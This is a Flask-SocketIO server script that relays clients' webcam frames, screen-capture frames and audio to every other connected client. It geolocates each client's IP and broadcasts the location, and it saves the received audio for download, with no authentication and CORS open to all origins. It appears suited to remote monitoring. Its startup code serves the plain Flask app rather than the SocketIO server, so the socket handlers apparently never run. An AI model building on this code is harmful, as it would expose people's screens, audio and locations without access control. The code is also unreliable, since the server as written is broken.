import os
import wave
import base64
import requests
from flask import Flask, render_template, send_from_directory, request
from flask_socketio import SocketIO, emit

app = Flask(__name__)
socketio = SocketIO(app, cors_allowed_origins="*")

# Buffer to store audio chunks
audio_frames = []

@app.route('/')
def index():
    return render_template('index.html')

@socketio.on('connect')
def on_connect():
    print(f"Client connected: {request.sid}")

@socketio.on('client_info')
def handle_client_info(data):
    ip = data.get('ip', 'Unknown')
    loc = {'ip': ip, 'city':'', 'region':'', 'country':'', 'latitude': None, 'longitude': None}
    try:
        res = requests.get(f'https://ipapi.co/{ip}/json/').json()
        loc.update({
            'city':     res.get('city',''),
            'region':   res.get('region',''),
            'country':  res.get('country_name',''),
            'latitude': res.get('latitude'),
            'longitude':res.get('longitude')
        })
    except Exception as e:
        print("Geolocation lookup failed:", e)
    emit('client_location', loc, broadcast=True)

@socketio.on('video_frame')
def handle_video(data):
    emit('video_frame', data, broadcast=True, include_self=False)

@socketio.on('screen_frame')
def handle_screen(data):
    emit('screen_frame', data, broadcast=True, include_self=False)

@socketio.on('audio_data')
def handle_audio(data):
    global audio_frames
    try:
        chunk = base64.b64decode(data)
        audio_frames.append(chunk)
    except Exception as e:
        print("Audio decode error:", e)
    emit('audio_data', data, broadcast=True, include_self=False)

@app.route('/save_audio')
def save_audio():
    global audio_frames
    if not audio_frames:
        return "No audio to save", 400
    try:
        wf = wave.open('received_audio.wav','wb')
        wf.setnchannels(1)
        wf.setsampwidth(2)
        wf.setframerate(44100)
        wf.writeframes(b"".join(audio_frames))
        wf.close()
        audio_frames = []
        return send_from_directory('.', 'received_audio.wav', as_attachment=True)
    except Exception as e:
        return f"Error saving audio: {e}", 500

if __name__ == '__main__':
    import eventlet
    import eventlet.wsgi
    port = int(os.environ.get('PORT', 5000))
    print(f"Starting server on 0.0.0.0:{port}")
    eventlet.wsgi.server(eventlet.listen(('', port)), app)
